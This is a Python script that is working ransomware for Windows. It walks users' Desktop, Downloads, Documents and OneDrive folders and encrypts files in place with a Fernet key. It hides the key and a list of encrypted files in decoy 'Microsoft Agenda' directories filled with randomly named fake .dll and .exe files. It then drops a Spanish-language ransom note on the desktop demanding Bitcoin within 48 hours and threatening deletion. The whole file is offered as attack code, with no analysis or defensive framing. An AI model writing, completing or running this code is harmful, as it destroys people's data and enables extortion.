import os
import random
from cryptography.fernet import Fernet

def findUsers(directory):
    users = []
    for f in os.scandir(directory):
        if f.name[0].isalpha() and f.is_dir() and not f.name == 'Default User':
            users.append(f.path)
    return users

def findFolders(users, target_dirs):
    folders = []
    for user in users:
        for target in target_dirs:
            nodrive_name = os.path.join(user, target)
            onedrive_name = os.path.join(user, f'OneDrive{target}')
            folders.append(nodrive_name)
            folders.append(onedrive_name)
    clean_folder = []
    for fld in folders:
        if os.path.isdir(fld):
            clean_folder.append(fld)
    return clean_folder

def createFolders(mydirlist):
    for mydir in mydirlist:
        if not os.path.exists(mydir):
            os.makedirs(mydir)
            
def fillme(treeseeds1):
    ######################
    ######################
    def randWord(tupleChoice):
        return random.choice(tupleChoice)

    def randNameGen():
        frst_comp = 'ms', '', 'wai', 'mlk', 'muuu'
        scnd_comp = 'looker', 'bmp', '', 'sql', 'bimp', 'exec' '32'
        thrd_comp = 'temp', 'setup', 'DMR_48' 'WIN' 'hev'
        extension = '.dll', '.mui', '.exe'

        while True:
            fc = randWord(frst_comp)
            sc = randWord(scnd_comp)
            tc = randWord(thrd_comp)
            ex = randWord(extension)

            tog = fc, sc, tc, ex
            ftog = ''.join(tog)

            yield ftog

    def getAplpha(simple):
        if simple:
            return '0123456789ABCDEF'
        def convChar(x):
            nonprintable = {
                '\x00': '^@',
                '\x01': '^A',
                '\x02': '^B',
                '\x03': '^C',
                '\x04': '^D',
                '\x05': '^E',
                '\x06': '^F',
                '\x07': '^G',
                '\x08': '^H',
                '\x09': '^I',
            }
            character = chr(x)
            return nonprintable.get(character, character)
        alphabet = random.sample(list(range(128)), 16)
        alphabet = list(map(lambda x : convChar(x), alphabet))
        return ''.join(alphabet)

    def randText(number_of_colors):
        color = ["#"+''.join([random.choice(getAplpha(False)) for j in range(6)])
                    for i in range(number_of_colors)]
        return ''.join(color)


    MIN_FILES = 1
    MAX_FILES = 3

    name_gen = randNameGen()

    numbers = [random.randint(MIN_FILES, MAX_FILES) for _ in treeseeds1]

    for numb, root in zip(numbers, treeseeds1):
        for _ in range(numb):
            name = next(name_gen)
            f11_name = os.path.join(root, name)
            volume = random.randint(1984, 2005)
            with open(f11_name, 'w') as f:
                text_info = randText(volume)
                f.write(text_info)
    ######################
    ######################


directory = r'C:\users'
users = findUsers(directory)

target_dirs = [
    'Desktop',
    'Downloads',
    'Documents'
]
folders = findFolders(users, target_dirs)


raw_additional_folders = [
    r'C:\Program Files\LibreOffice',
]

additional_folders = []
for fld in raw_additional_folders:
    if os.path.isdir(fld):
        additional_folders.append(fld)

folders_tog = folders + additional_folders
key = Fernet.generate_key()

mydirlist = [
    r'C:\Program Files (x86)\Microsoft Agenda\WindowsPowerShell (x86)',
    r'C:\Program Files (x86)\Microsoft Agenda\Windows Kits',
    r'C:\Program Files (x86)\Microsoft Agenda\Windows Agenda Mail',
    r'C:\Program Files (x86)\Microsoft Agenda\Windows Agenda',
    r'C:\Program Files (x86)\Microsoft Agenda\Windows Platform',
]

storage = mydirlist [2] 

createFolders(mydirlist)
fillme(mydirlist)

with open(fr'{storage}\key.txt', 'wb') as f:
    f.write(key)
print(folders_tog)
result = []
count = 0
countr = 0
for folder in folders_tog:
    for dirpath, dirnames, filenames in os.walk(folder):
        for filename in filenames:
            if 0 == count%50:
                print(f'Files Infected {count}')
            countr += 1
            if 0 == countr%50:
                print(f'Files Seen {countr}')
            if filename == 'desktop.ini':
                continue
            if not filename[0].isalpha() \
                and not filename[0].isdigit():
                continue
            name = os.path.join(dirpath, filename)
            with open (name, 'rb') as f:
                content = f.read()
            content_encripted = Fernet(key).encrypt(content)
            try:
                with open (name, 'wb') as f:
                    f.write(content_encripted)
            except Exception as e:
                print(e)
                continue
            result.append(name)
            count += 1 
print(len(result))
with open(fr'{storage}\list.txt', 'w') as f:
    for line in result:
        f.write(f"{line}\n")

username = os.getlogin() 
contents = 'Hemos encriptado todos sus archivos. \n\
Si quereis desencriptarlos teneis 48 horas para enviar \
X BTC a la siguiente direccion \n\
XXXXXX \n\
De lo contrario seran eliminados. \n\
Una vez se haya realizado el pago recibireis \
Instrucciones de como desencriptarlos. \n\
Muchas gracias por su amable colaboracion ;-)'

threatAddress1 = fr'C:\Users\{username}\Desktop'
if os.path.isdir(threatAddress1):
    with open(fr'{threatAddress1}\AVISO_ATAQUE.txt', 'w') as f:
        f.write(contents)

threatAddress2 = fr'C:\Users\{username}\OneDrive\Desktop'
if os.path.isdir(threatAddress2):
    with open(fr'{threatAddress2}\AVISO_ATAQUE.txt', 'w') as f:
        f.write(contents)
